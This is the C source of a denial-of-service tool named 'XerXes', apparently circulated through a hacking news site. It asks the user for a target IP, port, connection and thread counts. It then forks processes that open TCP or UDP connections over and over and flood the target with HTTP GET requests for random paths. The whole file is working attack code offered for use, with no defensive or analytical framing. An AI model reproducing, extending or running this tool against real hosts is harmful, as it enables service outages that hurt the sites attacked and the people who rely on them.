/* XerXes - Most powerful dos tool - THN (http://www.thehackernews.com) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

int Threads = 0;
int Connections = 0;

int make_socket(char *host, char *port, int modus) {
	struct addrinfo hints, *servinfo, *p;
	int sock, r;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;

	if(modus)
	  hints.ai_socktype = SOCK_STREAM;//TCP
	else
	  hints.ai_socktype = SOCK_DGRAM;//UDP

	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "No connection could be made\n");
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}

void broke(int s) {
	// do nothing
}

void attack(char *host, char *port, int id, int modus) {
	int sockets[Connections];
	int x, r, i, n, buf;
	char string[10];
	static int j = 0;
	char httpbuf[2024];
	char s_copy[132];



	for(x=0; x!= Connections; x++)
		sockets[x]=0;

	signal(SIGPIPE, &broke);

	while(1) {
		for(x=0; x != Connections; x++) {
			if(sockets[x] == 0)
				sockets[x] = make_socket(host, port, modus);
    
	srand(time(NULL));
	for( j = 0; j < 9; j++){
        string[j] = 'A' + rand()%26; // starting on '0', ending on '}'	
	}
	
	sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
	strncpy(s_copy, httpbuf, sizeof(s_copy));
	int sizebuf = sizeof s_copy - 1;
			r=write(sockets[x], s_copy, sizebuf);
			close(sockets[x]);
			sockets[x] = make_socket(host, port, modus);
			fprintf(stderr, "[Thread:%i Connection:%d %s]\n", id,x,s_copy);
		}
		usleep(300000);
	}
}

int main(int argc, char **argv) {
	int x;
	int modus;
	char ip[30];
	char port[6]; 

	printf("Modus: 0=UDP 1=TCP with HTTP Requests\n");
	scanf("%d", &modus);
	printf("Destination IP?\n");
    scanf("%s", &ip);
	printf("Destination Port?\n");
    scanf("%s",&port);
	printf("Connections?\n");
    scanf("%d",&Connections);
	printf("Threads?\n");
    scanf("%d",&Threads);

	for(x=0; x != Threads; ++x) {
		if(fork())
			attack(ip, port, x, modus);
		usleep(200000);
	}
	getc(stdin);
	return 0;
}